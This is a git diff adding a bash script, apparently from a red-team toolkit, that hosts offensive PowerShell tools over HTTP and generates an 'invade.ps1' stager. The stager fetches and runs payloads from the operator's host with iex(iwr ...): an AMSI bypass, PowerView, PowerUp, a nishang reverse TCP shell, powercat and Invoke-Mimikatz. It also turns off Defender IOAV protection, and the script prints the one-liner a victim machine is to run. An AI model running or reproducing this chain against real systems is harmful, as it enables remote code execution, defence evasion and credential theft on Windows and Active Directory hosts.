@@ -1,0 +1,120 @@
+#!/usr/bin/env bash
+
+### Helpers begin
+check_deps() {
+    for d in "${deps[@]}"; do
+        [[ -n $(command -v "$d") ]] || errx 128 "$d is not installed"
+    done; unset d
+}
+err() { echo -e "${color:+\e[31m}[!] $*\e[0m"; }
+errx() { err "${*:2}"; exit "$1"; }
+good() { echo -e "${color:+\e[32m}[+] $*\e[0m"; }
+info() { echo -e "${color:+\e[37m}[*] $*\e[0m"; }
+long_opt() {
+    local arg shift="0"
+    case "$1" in
+        "--"*"="*) arg="${1#*=}"; [[ -n $arg ]] || usage 127 ;;
+        *) shift="1"; shift; [[ $# -gt 0 ]] || usage 127; arg="$1" ;;
+    esac
+    echo "$arg"
+    return $shift
+}
+subinfo() { echo -e "${color:+\e[36m}[=] $*\e[0m"; }
+warn() { echo -e "${color:+\e[33m}[-] $*\e[0m"; }
+### Helpers end
+
+simplehttp() {
+    if [[ -n $(command -v ruby) ]]; then
+        ruby -e httpd -r un -- -p "$1"
+    elif [[ -n $(command -v python3) ]]; then
+        python3 -m http.server "$1"
+    elif [[ -n $(command -v python2) ]]; then
+        python2 -m SimpleHTTPServer "$1"
+    elif [[ -n $(command -v php) ]]; then
+        php -S 0.0.0.0:"$1"
+    else
+        errx 99 "Can't find php, python2, python3, or ruby"
+    fi
+}
+
+usage() {
+    cat <<EOF
+Usage: ${0##*/} [OPTIONS] <ip>
+
+Spin up a simple HTTP server to host the RedArmy scripts.
+
+Options:
+    -h, --help        Display this help message
+    --no-color        Disable colorized output
+    -p, --port=NUM    Use the specified port (default: 8080)
+    -u, --update      Update git submodules (if git is installed)
+
+EOF
+    exit "$1"
+}
+
+declare -a args deps
+unset help update
+color="true"
+# deps+=("todo")
+port="8080"
+
+# Check for missing dependencies
+check_deps
+
+# Parse command line options
+while [[ $# -gt 0 ]]; do
+    case "$1" in
+        "--") shift && args+=("$@") && break ;;
+        "-h"|"--help") help="true" ;;
+        "--no-color") unset color ;;
+        "-p"|"--port"*) port="$(long_opt "$@")" || shift ;;
+        "-u"|"--update"*) update="true" ;;
+        *) args+=("$1") ;;
+    esac
+    shift
+done
+[[ ${#args[@]} -eq 0 ]] || set -- "${args[@]}"
+
+# Check for valid params
+[[ -z $help ]] || usage 0
+[[ $# -eq 1 ]] || usage 1
+
+ip="$1"
+
+if [[ -n $(command -v git) ]] && [[ -n $update ]]; then
+    git submodule update --init --recursive
+fi
+
+# Setup invade.ps1
+cat >invade.ps1 <<EOF
+iwr -OutFile C:\\Windows\\Temp\\Microsoft.ActiveDirectory.Management.dll -UseBasicParsing http://$ip:$port/ADModule/Microsoft.ActiveDirectory.Management.dll
+Import-Module C:\\Windows\\Temp\\Microsoft.ActiveDirectory.Management.dll
+
+iex (iwr -UseBasicParsing http://$ip:$port/amsi_bypass.ps1)
+iex (iwr -UseBasicParsing http://$ip:$port/PowerSploit/Recon/PowerView.ps1)
+iex (iwr -UseBasicParsing http://$ip:$port/PowerSploit/Privesc/PowerUp.ps1)
+
+iex (iwr -UseBasicParsing http://$ip:$port/nishang/Shells/Invoke-PowerShellTcp.ps1)
+iex (iwr -UseBasicParsing http://$ip:$port/powercat/powercat.ps1)
+
+Set-MpPreference -DisableIOAVProtection \$true -ErrorAction Ignore
+iex (iwr -UseBasicParsing http://$ip:$port/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1)
+EOF
+
+# Let user know what to type
+info "iex (iwr -UseBasicParsing http://$ip:$port/invade.ps1)"
+
+# Open firewall
+sudo iptables -I INPUT -p tcp -d "$ip" --dport "$port" -j ACCEPT
+sudo iptables -I INPUT -p udp -d "$ip" --dport "$port" -j ACCEPT
+
+# Serve via HTTP
+simplehttp "$port"
+
+# Close firewall
+sudo iptables -D INPUT -p tcp -d "$ip" --dport "$port" -j ACCEPT
+sudo iptables -D INPUT -p udp -d "$ip" --dport "$port" -j ACCEPT
+
+# Cleanup
+rm -f invade.ps1
